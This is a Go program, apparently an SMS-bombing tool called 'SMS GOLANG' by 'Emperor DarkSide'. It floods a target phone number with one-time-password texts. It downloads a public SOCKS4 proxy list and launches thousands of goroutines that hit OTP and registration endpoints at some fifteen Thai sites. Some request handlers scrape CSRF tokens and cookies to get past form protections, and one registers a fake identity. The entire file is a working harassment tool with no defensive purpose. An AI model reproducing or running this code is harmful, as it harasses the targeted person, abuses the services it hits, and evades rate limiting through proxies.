package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/Pallinder/go-randomdata"
	"github.com/corpix/uarand" 
	"h12.io/socks"
)

var (
	count = 0
)

func init() {
	rand.Seed(time.Now().UnixNano()) //fixed seed problem
}

func randomString(l int) string {
	// rand.Seed(time.Now().UnixNano())
	var pool = "abcdefghijklmnopqrstuvwxyzABCEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	bytes := make([]byte, l)
	for i := 0; i < l; i++ {
		bytes[i] = pool[rand.Intn(len(pool))]
	}
	return string(bytes)
}
func send(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://api.ufaz88regis.com/api/getOtp"
				method := "POST"
				payload := strings.NewReader("phone=" + phonenumber + "&aff_link=1%24SkWbahhDXS1")
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [ufaz88regis: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send2(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://referral.huaydee.com/v1/sendotp"
				method := "POST"
				payload := strings.NewReader(`{"phone": "+66` + phonenumber + `"}`)
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("x-api-key", "0tWnR4S38L6MD3aysXVjF83M0qaIwfdm1AeiiNDn")
				req.Header.Add("Content-Type", "application/json")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [huaydee: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send3(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://www.konglor888.com/api/otp/register"
				method := "POST"
				payload := strings.NewReader("applicant=" + phonenumber + "&serviceName=KONGLOR888")
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [konglor888: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send4(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://www.hit789.com/api/otp/register"
				method := "POST"
				payload := strings.NewReader("applicant=" + phonenumber + "&serviceName=HIT789")
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				fmt.Printf("[THREAD: %.0f] [%s] [hit789: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send5(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://api.scg-id.com/api/otp/send_otp"
				method := "POST"
				payload := strings.NewReader(`{"phone_no": "` + phonenumber + `"}`)
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("Content-Type", "application/json")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [scg: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send6(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://api.set.or.th/api/member/registration"
				method := "POST"
				payload := strings.NewReader(`{"itizenId": "4751762444328","country": "th","email": "sogood@meowmeow.com","firstName": "แมว","gender": "M","lastName": "รักน่าที่สุด","mobile": "` + phonenumber + `","passport": "","password": "BossNz#9999","subscriptionFlag": "true","termFlag": "true"}`)
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("Content-Type", "application/json")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				body, err := ioutil.ReadAll(res.Body)
				if err != nil {
					// fmt.Println(err)
					break
				}
				type Jsondata struct {
					UserRef int
				}
				var userRef Jsondata
				json.Unmarshal([]byte(string(body)), &userRef)
				url2 := "https://api.set.or.th/api/otp/request"
				method2 := "POST"
				payload2 := strings.NewReader(`{"channel": "MOBILE","refID": "` + strconv.Itoa(userRef.UserRef) + `","type": "REGISTRATION"}`)
				tr2 := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				client2 := &http.Client{Transport: tr2}
				req2, err := http.NewRequest(method2, url2, payload2)
				if err != nil {
					break
				}
				req2.Header.Add("Content-Type", "application/json")
				res2, err := client2.Do(req2)
				if err != nil {
					break
				}
				defer res2.Body.Close()
				if res2.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [Setmember: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send7(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://www.qqmoney.ltd/jackey/sms/login"
				method := "POST"
				payload := strings.NewReader(`{"appId": "5fc9ff297eb51f1196350635","companyId": "5fc9ff12197278da22aff029","mobile": "` + phonenumber + `"}`)
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("Content-Type", "application/json")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [qqmoney: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send8(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "http://m.thaiuang.com/uc/authcode/sms/get/reg/" + phonenumber
				method := "GET"
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, nil)
				if err != nil {
					break
				}
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [thaiuang: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send9(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://baht4u.com/api/ext/send/sms?phone=0989193177&triggerType=REGISTER_OR_LOGIN"
				method := "POST"
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, nil)
				if err != nil {
					break
				}
				req.Header.Add("Content-Length", "0")
				req.Header.Add("DEVICEID", randomString(32))
				req.Header.Add("Origin", "https://baht4u.com")
				req.Header.Add("LANGUAGE", "th")
				req.Header.Add("VERSION", "1.0.4")
				req.Header.Add("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; SM-N960N Build/LMY49I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Safari/537.36gpminiapp")
				req.Header.Add("Accept", "application/json, text/plain, */*")
				req.Header.Add("CHANNEL", "a-minibaht4u")
				req.Header.Add("DEVICETYPE", "H5_Android")
				req.Header.Add("Referer", "https://baht4u.com/b4uh5/")
				req.Header.Add("Accept-Encoding", "gzip, deflate")
				req.Header.Add("Accept-Language", "th-TH,en-US;q=0.8")
				req.Header.Add("Cookie", "locale=th; deviceType=H5_Android; country=TH; currency=THB")
				req.Header.Add("X-Requested-With", "com.baht4u.gpapp")
				req.Header.Add("Connection", "keep-alive")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [baht4u: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send10(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://api2.1112.com/api/v1/otp/create"
				method := "POST"
				payload := strings.NewReader(`{"language": "th","phonenumber": "` + phonenumber + `"}`)
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("Content-Type", "application/json")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [Pizza1112: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send11(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://www.fox888.com/api/otp/register"
				method := "POST"
				payload := strings.NewReader("applicant=" + phonenumber + "&serviceName=FOX888")
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [fox888: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send12(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://qbabet.com/member/action.php?get_otp"
				method := "POST"
				payload := strings.NewReader("phone=" + phonenumber + "&ip=" + randomdata.IpV4Address())
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [qbabet: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send13(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				client := &http.Client{Transport: tr}
				url := "https://www.shopat24.com/register/"
				method := "GET"
				req, err := http.NewRequest(method, url, nil)
				if err != nil {
					break
				}
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				body, err := ioutil.ReadAll(res.Body)
				if err != nil {
					break
				}
				a := strings.Split(string(body), "_csrf")
				if len(a) != 8 {
					break
				}
				csrf := strings.Split(strings.Split(strings.Split(string(body), "_csrf")[7], "value=")[1], " />")[0]
				if csrf[0] == '"' {
					csrf = csrf[1:]
				}
				if i := len(csrf) - 1; csrf[i] == '"' {
					csrf = csrf[:i]
				}
				setcookie := res.Header["Set-Cookie"][0] + " " + res.Header["Set-Cookie"][1]
				fmt.Sprintf(csrf)
				fmt.Sprintf(setcookie)
				url2 := "https://www.shopat24.com/register/ajax/requestotp/"
				method2 := "POST"
				payload := strings.NewReader("phoneNumber=" + phonenumber)
				client2 := &http.Client{Transport: tr}
				req2, err := http.NewRequest(method2, url2, payload)
				if err != nil {
					break
				}
				req2.Header.Add("x-csrf-token", csrf)
				req2.Header.Add("cookie", setcookie)
				req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				req2.Header.Add("user-agent", uarand.GetRandom())
				res2, err := client2.Do(req2)
				if err != nil {
					break
				}
				defer res2.Body.Close()
				fmt.Printf("[THREAD: %.0f] [%s] [shopat24: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send14(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				url := "https://cpfmapi.addressasia.com/wp-json/cpfm/v2/customer/get_otp"
				method := "POST"
				payload := strings.NewReader(`{"phone":"` + phonenumber + `"}`)
				client := &http.Client{Transport: tr}
				req, err := http.NewRequest(method, url, payload)
				if err != nil {
					break
				}
				req.Header.Add("Content-Type", "application/json")
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				if res.StatusCode != 200 {
					break
				}
				fmt.Printf("[THREAD: %.0f] [%s] [CP: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}

func send15(thread_id int, phonenumber string, threads int, proxy_list []string) {
	for {
		for {
			if count == threads {
				os.Exit(1)
			} else {
				proxy_ip := proxy_list[rand.Intn(len(proxy_list))]
				proxies_raw := "socks4://" + proxy_ip
				dialSocksProxy := socks.Dial(proxies_raw)
				tr := &http.Transport{
					Dial:                  dialSocksProxy,
					ResponseHeaderTimeout: 1 * time.Second,
					ExpectContinueTimeout: 1 * time.Second,
					TLSHandshakeTimeout:   1 * time.Second,
					ForceAttemptHTTP2:     true,
				}
				client := &http.Client{Transport: tr}
				url := "https://www.allcasino.bet/_ajax_/register"
				method := "GET"
				req, err := http.NewRequest(method, url, nil)
				if err != nil {
					break
				}
				res, err := client.Do(req)
				if err != nil {
					break
				}
				defer res.Body.Close()
				body, err := ioutil.ReadAll(res.Body)
				if err != nil {
					break
				}
				a := strings.Split(string(body), `<input type="hidden" id="request_otp__token" name="request_otp[_token]" value="`)
				// fmt.Println(len(a))
				if len(a) != 2 {
					break
				}
				token := strings.Split(a[1], `" />`)[0]
				// token := strings.Split(strings.Split(strings.Split(a, "value=")[1], `" />`)[0], `"`)[1]
				// if csrf[0] == '"' {
				// 	csrf = csrf[1:]
				// }
				// if i := len(csrf) - 1; csrf[i] == '"' {
				// 	csrf = csrf[:i]
				// }
				setcookie := strings.Split(strings.Split(res.Header["Set-Cookie"][0], `PHPSESSID=`)[1], `;`)[0]
				// fmt.Println(b)
				// fmt.Println(setcookie)
				url2 := "https://www.allcasino.bet/_ajax_/request-otp"
				method2 := "POST"
				payload := strings.NewReader("request_otp%5BphoneNumber%5D=" + phonenumber + "&request_otp%5BtermAndCondition%5D=1&request_otp%5B_token%5D=" + token)
				client2 := &http.Client{Transport: tr}
				req2, err := http.NewRequest(method2, url2, payload)
				if err != nil {
					break
				}
				req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
				req2.Header.Add("Cookie", "PHPSESSID="+setcookie)
				res2, err := client2.Do(req2)
				if err != nil {
					break
				}
				defer res2.Body.Close()
				// body2, err := ioutil.ReadAll(res2.Body)
				// if err != nil {
				// 	fmt.Println(err)
				// 	return
				// }
				// fmt.Println(string(body2))
				fmt.Printf("[THREAD: %.0f] [%s] [allcasino: success] [%.0f]\n", float64(thread_id+1), proxy_ip, float64(count+1))
				count++
				break
			}
		}
	}
}
func main() {
	if len(os.Args) != 3 {
fmt.Println("███████████████████████████████████")
fmt.Println("█▄─▄███▄─▄█▄─▄███─▄─▄─█▄─▄███▄─▄▄─█")
fmt.Println("██─██▀██─███─██▀███─████─██▀██─▄█▀█")
fmt.Println("▀▄▄▄▄▄▀▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀")
fmt.Println(" SMS GOLANG ")
fmt.Println(" Emperor DarkSide : LilTle#0075 ")
		fmt.Println("go run sms.go [phonenumber] [amount]")
		os.Exit(1)
	}
	phonenumber := os.Args[1]
	time_count, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("count should be a integer")
	}
	url := "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt"
	method := "GET"
	client := &http.Client{}
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		fmt.Println(err)
		return
	}
	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		fmt.Println(err)
		return
	}
	proxy_list := strings.Fields(string(body))
	fmt.Println("███████████████████████████████████")
	fmt.Println("█▄─▄███▄─▄█▄─▄███─▄─▄─█▄─▄███▄─▄▄─█")
	fmt.Println("██─██▀██─███─██▀███─████─██▀██─▄█▀█")
	fmt.Println("▀▄▄▄▄▄▀▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▄▀")
fmt.Println(" Emperor DarkSide : LilTle#0075 ")
	fmt.Println("GET SOCK4:", len(proxy_list))
	for i := 0; i < 3000; i++ {
		case_number := 14
		switch rand.Intn(case_number + 1) {
		case 0:
			go send(i, phonenumber, time_count, proxy_list)
		case 1:
			go send2(i, phonenumber, time_count, proxy_list)
		case 2:
			go send3(i, phonenumber, time_count, proxy_list)
		case 3:
			go send4(i, phonenumber, time_count, proxy_list)
		case 4:
			go send5(i, phonenumber, time_count, proxy_list)
		case 5:
			go send6(i, phonenumber, time_count, proxy_list)
		case 6:
			go send7(i, phonenumber, time_count, proxy_list)
		case 7:
			go send8(i, phonenumber, time_count, proxy_list)
		case 8:
			go send9(i, phonenumber, time_count, proxy_list)
		case 9:
			go send10(i, phonenumber, time_count, proxy_list)
		case 10:
			go send11(i, phonenumber, time_count, proxy_list)
		case 11:
			go send12(i, phonenumber, time_count, proxy_list)
		case 12:
			go send13(i, phonenumber, time_count, proxy_list)
		case 13:
			go send14(i, phonenumber, time_count, proxy_list)
		case 14:
			go send15(i, phonenumber, time_count, proxy_list)
		}
		time.Sleep(time.Microsecond * 100)
		os.Stdout.Sync()
	}
	time.Sleep(1138800 * time.Hour)
}
